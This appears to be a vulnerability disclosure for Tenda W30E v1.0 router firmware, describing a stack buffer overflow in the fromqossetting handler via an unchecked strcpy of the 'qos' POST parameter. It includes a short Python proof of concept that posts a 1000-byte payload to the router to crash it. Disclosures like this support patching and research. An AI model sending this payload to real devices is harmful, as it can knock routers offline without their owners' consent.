## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2218.html

## Affected version

W30Ev1.0 V1.0.1.25(633)

## Vulnerability details

The Tenda W30Ev1.0 V1.0.1.25(633) firmware has a stack overflow vulnerability located in the `fromqossetting` function. This function accepts the `qos` parameter from a POST request. The statement `v1 = strcpy(dest, src);` leads to a buffer overflow. The user-supplied `qos` can exceed the capacity of the `dest` array, thus triggering this security vulnerability.

![image-20240409110218342](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409110218342.png)

![image-20240409110338589](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409110338589.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/fromqossetting"
payload = b"a"*1000

data = {"op":"aaa","qos": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409103000348](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409103000348.png)